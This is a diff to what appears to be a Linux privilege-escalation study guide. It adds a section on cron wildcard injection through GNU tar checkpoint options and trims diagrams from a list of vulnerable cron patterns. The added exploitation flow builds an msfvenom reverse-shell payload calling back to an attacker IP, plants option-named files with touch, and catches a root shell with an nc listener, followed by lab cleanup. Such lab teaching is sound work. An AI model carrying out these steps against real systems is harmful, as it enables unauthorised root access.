@@ -847,53 +847,112 @@ The important question is:
 
 ---
 
+# Cron Wildcard Injection
+
+### Wildcard Injection
+
+A **wildcard injection** vulnerability can occur when a cron script passes a wildcard such as `*` to a command without properly handling filenames.
+
+Example:
+```bash
+tar -czf backup.tar.gz *
+```
+
+The shell expands `*` **before** executing `tar`.
+
+If the directory contains:
+```text
+file1.txt
+file2.txt
+--checkpoint=1
+--checkpoint-action=exec=shell.elf
+```
+
+the command effectively becomes something similar to:
+```bash
+tar -czf backup.tar.gz file1.txt file2.txt --checkpoint=1 --checkpoint-action=exec=shell.elf
+```
+
+Because these filenames look like valid `tar` options, `tar` can interpret them as **command-line arguments rather than ordinary filenames**.
+
+### Why This Can Lead to Privilege Escalation
+
+Consider a cron script:
+
+```bash
+#!/bin/bash
+tar -czf /tmp/backup.tar.gz /home/user/*
+```
+
+If this script runs as **root**, but the attacker can create files inside `/home/user/`, the attacker may be able to inject `tar` options through specially crafted filenames.
+
+GNU `tar` provides checkpoint functionality, including options such as:
+
+```text
+--checkpoint=1
+--checkpoint-action=exec=<command>
+```
+
+The second option allows `tar` to execute a command when a checkpoint is reached.
+
+Therefore, if an attacker can influence the files matched by `*`, they may be able to influence the arguments passed to a privileged `tar` process.
+
+
+### Exploitation Flow
+
+Generate a reverse-shell ELF payload:
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+```
+
+Replace `LHOST` with your Kali machine's IP address.
+
+Transfer the payload to the target and make it executable:
+```bash
+chmod +x /home/user/shell.elf
+```
+
+Create filenames that correspond to `tar` options:
+```bash
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+
+When the cron job executes the wildcard, these filenames can be expanded into the `tar` command as arguments.
+
+Start the listener on Kali:
+```bash
+nc -nvlp 4444
+```
+
+When the cron job executes as root, the payload can connect back and provide a **root shell**.
+
+### Cleanup
+
+After the lab:
+```bash
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+```
+
+This is important because leaving the malicious files behind could cause the cron job to execute the payload again.
+
+### Key Concept
+
+> **The vulnerability is not simply the use of `tar`. The problem is allowing attacker-controlled filenames to become command-line options through an unquoted/unprotected wildcard.**
+
+---
+
 # 25. What Makes a Cron Job Vulnerable?
 
 A cron job becomes interesting when you find a relationship like:
 ### Case 1 — Writable script
-```text
-root cron
-   ↓
-/opt/script.sh
-   ↓
-script writable by user
-```
-
 ### Case 2 — Writable parent directory
-```text
-root cron
-   ↓
-/opt/scripts/script.sh
-   ↓
-/opt/scripts writable
-```
-
 ### Case 3 — PATH hijacking
-```text
-root cron
-   ↓
-backup
-   ↓
-writable PATH directory
-```
-
 ### Case 4 — Writable configuration
-```text
-root cron
-   ↓
-script
-   ↓
-writable config file
-```
-
 ### Case 5 — Dangerous relative paths
-```text
-root cron
-   ↓
-relative file/program
-   ↓
-attacker controls lookup location
-```
+### Case 6 — Cron Wildcard Injection
 
 ---
 
